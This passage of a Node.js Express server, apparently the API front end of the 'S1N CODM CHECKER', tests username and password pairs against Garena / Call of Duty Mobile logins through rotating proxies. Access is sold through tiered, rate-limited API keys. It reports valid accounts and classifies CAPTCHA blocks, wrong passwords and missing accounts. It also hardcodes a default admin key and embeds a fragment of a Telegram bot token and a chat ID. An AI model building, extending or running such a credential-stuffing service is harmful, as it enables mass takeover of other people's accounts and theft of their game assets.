        return res.status(validationResult.status).json({ error: validationResult.message });
    }

    req.apiKeyData = validationResult.keyData; // Attach key data for potential use in the route
    logging.info(`API key '${apiKey.substring(0,5)}...' (User: ${validationResult.keyData.userId}, Tier: ${validationResult.keyData.tierName}) validated for request to ${req.path}. Checks made: ${validationResult.keyData.checksMade}/${validationResult.keyData.checkLimit}`);
    next();
};

// A very simple admin protection, replace with something robust in production
const ADMIN_MASTER_KEY = process.env.ADMIN_MASTER_KEY || "sinluna";

const adminAuthMiddleware = (req, res, next) => {
    const masterKey = req.headers['x-admin-key']; // Admin key passed in header
    if (masterKey === ADMIN_MASTER_KEY) {
        next();
    } else {
        logging.warning(`Admin endpoint access denied. Path: ${req.path}`);
        res.status(403).json({ error: "Forbidden: Admin access required." });
    }
};


// API Endpoint for single account check (GET and POST)
app.all('/api/check', apiKeyMiddleware, async (req, res) => {
    logging.info(`API /api/check called by user ${req.apiKeyData.userId} (key: ${req.apiKeyData.apiKey.substring(0,5)}...)`);

    const user = req.query.user || req.body.user;
    const password = req.query.password || req.body.password;
    const proxyParam = req.query.proxy || req.body.proxy; // Optional: e.g., "http://user:pass@host:port"

    if (!user || !password) {
        logging.warning('/api/check: Missing user or password.');
        return res.status(400).json({ error: "User and password are required." });
    }

    logging.info(`/api/check: Checking account for user: ${user.substring(0,3)}...`);

    let proxyForCheck = null;
    if (proxyParam && typeof proxyParam === 'string') {
        try {
            new URL(proxyParam); // Basic validation
            proxyForCheck = { http: proxyParam, https: proxyParam }; // Format for buildAxiosProxyConfig
            logging.info(`/api/check: Using proxy: ${proxyParam.split('@').pop()}`); // Log proxy host, not creds
        } catch (e) {
            logging.warning(`/api/check: Invalid proxy URL format provided: ${proxyParam}`);
            return res.status(400).json({ error: "Invalid proxy URL format." });
        }
    }

    try {
        const date_timestamp = get_current_timestamp();
        const session_initial_cookies_tuple = starting_cookies();
        
        const result = await check_account(
            user,
            password,
            date_timestamp,
            session_initial_cookies_tuple,
            proxyForCheck,
            null, // datadome_for_prelogin_attempt
            REQUEST_TIMEOUT
        );

        // Remove password from the successful result before sending to client
        if (typeof result === 'object' && result !== null && !Array.isArray(result) && result.password) {
            delete result.password;
        }


        if (typeof result === 'object' && result !== null && !Array.isArray(result)) {
            logging.info(`/api/check: Success for user ${user.substring(0,3)}.... Level: ${(result.codm_details || {}).level}`);
            return res.status(200).json({ status: "success", data: result });
        } else if (Array.isArray(result) && result[0] === "CODM_FAILURE") {
            const [, fail_user, , fail_reason] = result; // fail_pass is result[2], not needed here
            const clean_reason = strip_ansi_codes(fail_reason);
            logging.warning(`/api/check: CODM_FAILURE for user ${fail_user.substring(0,3)}.... Reason: ${clean_reason}`);
            return res.status(200).json({ 
                status: "partial_success",
                message: "Garena login successful, but CODM check failed.",
                details: clean_reason,
                error_type: "CODM_FAILURE",
                username: fail_user
            });
        } else if (typeof result === 'string') {
            const error_message = strip_ansi_codes(result);
            logging.warning(`/api/check: Failed for user ${user.substring(0,3)}.... Reason: ${error_message}`);
            let statusCode = 400; // Default bad request
            if (error_message.startsWith("[🤖] CAPTCHA")) statusCode = 429; // Too many requests (often due to CAPTCHA)
            else if (error_message.includes("INCORRECT PASSWORD")) statusCode = 401; // Unauthorized
            else if (error_message.startsWith("[👻] ACCOUNT DOESN'T EXIST")) statusCode = 404; // Not Found
            else if (error_message.includes("FORBIDDEN (403)")) statusCode = 403; // Forbidden
            else if (error_message.startsWith("[⏱️]") || error_message.includes("TIMEOUT")) statusCode = 504; // Gateway Timeout
            else if (error_message.startsWith("[🔴]") || error_message.startsWith("[🔌]") || error_message.includes("CONNECTION ERROR")) statusCode = 502; // Bad Gateway
            
            return res.status(statusCode).json({ status: "error", message: error_message, error_type: "CHECK_FAILED" });
        } else {
            logging.error(`/api/check: Unexpected result type for user ${user.substring(0,3)}.... Result: ${JSON.stringify(result).substring(0,200)}`);
            return res.status(500).json({ error: "Internal server error: Unexpected result type from checker." });
        }

    } catch (error) {
        logging.error(`Error during /api/check for user ${user.substring(0,3)}...:`, error.message, error.stack);
        if (error.isSysExit) { // Handle custom sys.exit errors
            return res.status(500).json({ error: "Critical internal error encountered during check.", details: error.message });
        }
        res.status(500).json({ error: "Internal server error during account check", details: error.message });
    }
});


// Admin Endpoints for "Bot" to Manage API Keys
app.post('/admin/keys/add', adminAuthMiddleware, (req, res) => {
    const { userId, tierName } = req.body; // tierName should be 'free', 'paid1', or 'paid2'
    if (!userId || !tierName) {
        return res.status(400).json({ error: "userId and tierName are required." });
    }
    if (!apiKeyManager.TIERS[tierName]) {
        return res.status(400).json({ error: `Invalid tierName. Valid tiers: ${Object.keys(apiKeyManager.TIERS).join(', ')}` });
    }
    const result = apiKeyManager.addApiKey(userId, tierName);
    logging.info(`Admin: Added API key for user ${userId}, tier ${tierName}. Key: ${result.apiKey.substring(0,5)}...`);
    res.status(201).json(result);
});

app.post('/admin/keys/remove', adminAuthMiddleware, (req, res) => { // Changed to POST for consistency with body
    const { apiKey } = req.body;
    if (!apiKey) {
        return res.status(400).json({ error: "apiKey is required." });
    }
    const result = apiKeyManager.removeApiKey(apiKey);
    if (result.error) {
        return res.status(404).json(result);
    }
    logging.info(`Admin: Removed API key ${apiKey.substring(0,5)}...`);
    res.status(200).json(result);
});

app.get('/admin/keys/info/:apiKey', adminAuthMiddleware, (req, res) => {
    const { apiKey } = req.params;
    const result = apiKeyManager.getApiKeyInfo(apiKey);
    if (result.error) {
        return res.status(404).json(result);
    }
    res.status(200).json(result);
});

app.get('/admin/keys/user/:userId', adminAuthMiddleware, (req, res) => {
    const { userId } = req.params;
    const result = apiKeyManager.findApiKeysByUserId(userId); // Changed to findApiKeysByUserId (plural)
    if (result.error) {
        return res.status(404).json(result);
    }
    res.status(200).json(result);
});

app.get('/admin/keys/all', adminAuthMiddleware, (req, res) => {
    const allKeys = apiKeyManager.getAllKeys();
    // For security, you might want to map this to exclude sensitive parts or full history for a summary view
    const overview = Object.values(allKeys).map(k => ({
        apiKey: k.apiKey,
        userId: k.userId,
        tierName: k.tierName,
        checksMade: k.checksMade,
        checkLimit: k.checkLimit,
        lastReset: k.lastReset,
        validUntil: k.validUntil,
        createdAt: k.createdAt
    }));
    res.status(200).json({ keys: overview });
});


// Global error handler for Express
app.use((err, req, res, next) => {
    logging.error("Unhandled Express error:", err.stack || err.message || err);
    if (err.isSysExit) {
        return res.status(500).json({ error: "Critical internal process error", details: err.message, code: err.exitCode });
    }
    res.status(500).json({ error: "Internal Server Error", details: strip_ansi_codes(err.message) });
});

// Function to display a banner once at startup
function displayStartupBanner() {
    const banner = `
${COLORS['CYAN']}
  ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⣀⣀⣀⠔⡪⣵⣮⣽⡿⢿⣿⣿⡿⢐⡠⢀⠀⠀⠀⠀⠀⠀
  ⢁⡠⢒⣼⡿⠿⠓⠉⠀⠀⠀⠙⢏⣔⠉⠈⣷⣷⣆⠀⠀⠀⠀
  ⠀⣰⢿⠋⠀⣴⣦⣦⣄⡀⠀⠀⠀⠙⢶⣿⣿⠟⢹⡷⡀⠀⠀
  ⡞⣴⠃⠀⠀⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠉⠻⡴⠋⣠⢿⡀⠀
  ⢡⣯⡤⡀⠀⠘⠿⣿⣷⣿⠟⠁⠀⠀⠀⠀⠀⠈⠺⢧⡄⣧⠀
  ⡾⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣶⣄⠀⠀⠀⠀⢹⡟⡆
  ⠁⢰⣿⡟⢄⠀⠀⣴⣿⣿⠀⠘⣿⣯⣿⣿⣷⡀⠀⢠⣿⡇⠇
  ⠀⠈⢃⡵⢍⠦⣄⠀⠚⠃⠀⠀⠹⣿⣿⣯⣿⡇⠠⢻⣿⡽⠀
  ⠀⠀⠀⠉⢁⡕⢍⡱⢢⡀⠀⣀⡀⠈⠉⠉⠉⢀⣴⡟⢹⡄⠀
  ⡄⠀⠀⠀⠀⢀⡺⠨⠳⣼⣿⠟⠻⣗⠄⢀⣴⡿⠋⡰⢃⡇⠀
  ⣿⣷⣄⣀⡀⢚⣿⣶⣄⡉⠁⣠⣶⣾⣿⣿⣋⠔⠋⢠⠜⠀⠀
${COLORS['YELLOW']} S1N CODM CHECKER: API VERSION${COLORS['BOLD']}${COLORS['RESET']}
`;
    console.log(banner);
}


async function main_api_start() {
    const log_dir = "logs";
    fsExtra.ensureDirSync(log_dir); // fsExtra is good for this
    const log_file = path.join(log_dir, `checker_api_run_${get_current_timestamp()}.log`);
    
    logging.basicConfig({
        level: logging.INFO, 
        handlers: [new logging.FileHandler(log_file, 'utf-8')],
    });
    
    logging.info(`--- API SCRIPT STARTED (PID: ${process.pid}) ---`);
    logging.info(`NODE.JS VERSION: ${process.version}, PLATFORM: ${platform.system()} (${platform.release()})`);
    logging.info(`LOG LEVEL: ${logging.getLevelName(logging.getLogger().level)}`);
    console.log(`${COLORS['GREY']}LOGGING DETAILED INFO TO: ${log_file}${COLORS['RESET']}`);

    // Ensure data files directory exists if they are in a sub-directory (e.g., 'data/')
    // For .datadome.json and .newCookies.json, they are in the root.
    // api_keys.json is also in the root by default in api_keys_manager.js

    app.listen(PORT, () => {
        if (os.platform() === 'win32') console.log('\x1Bc'); else console.log('\x1B[2J\x1B[3J\x1B[H'); // Clear screen once
        displayStartupBanner();
        console.log(`${COLORS['GREEN']}S1N CODM CHECKER API IS LISTENING ON PORT ${PORT}${COLORS['RESET']}`);
        console.log(`${COLORS['YELLOW']}API Endpoint: /api/check (GET/POST)${COLORS['RESET']}`);
        console.log(`${COLORS['CYAN']}  Required params: apikey, user, password.`);
        console.log(`${COLORS['CYAN']}  Optional param: proxy (full proxy URL string).`);
        console.log(`${COLORS['YELLOW']}Admin API Endpoints for key management (require 'x-admin-key' header):${COLORS['RESET']}`);
        console.log(`  POST /admin/keys/add {userId, tierName} -> Create Key`);
        console.log(`  POST /admin/keys/remove {apiKey} -> Remove Key`);
        console.log(`  GET  /admin/keys/info/:apiKey -> Get Key Info`);
        console.log(`  GET  /admin/keys/user/:userId -> Get User's Key(s) Info`);
        console.log(`  GET  /admin/keys/all -> Get All Keys Overview`);
        if (ADMIN_MASTER_KEY === "sinluna") {
            console.warn(`${COLORS['RED_BG']}WARNING: Default ADMIN_MASTER_KEY is being used. Please set a strong key via environment variable.${COLORS['RESET']}`);
        }
        if (TELEGRAM_BOT_TOKEN.includes("AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo") || TELEGRAM_CHAT_ID === "6542321044") {
            logging.warning("Default/Placeholder Telegram token/chat ID detected. Telegram notifications might not work or go to an unintended destination.");
        }
    });
}

if (require.main === module) { 
    main_api_start().catch(err => {
        const clean_error_msg = strip_ansi_codes(String(err.message || err));
        console.error(`${COLORS['RED_BG']}${COLORS['WHITE']} 💥 A CRITICAL ERROR OCCURRED DURING API STARTUP: ${htmlEscape(clean_error_msg)} ${COLORS['RESET']}`);
        logging.critical("CRITICAL ERROR IN API STARTUP", err);
        process.exit(1); // Use Node's process.exit for critical startup failures
    });
}

process.on('SIGINT', () => {
    console.log(`\n${COLORS['RED']}🛑 USER INTERRUPTION (SIGINT). EXITING GRACEFULLY...${COLORS['RESET']}`);
    logging.warning("USER INTERRUPTION (SIGINT). EXITING.");
    process.exit(0);
});

process.on('exit', (code) => {
    logging.info(`--- SCRIPT FINISHED WITH CODE ${code} ---`);
    console.log(Style.RESET_ALL); 
});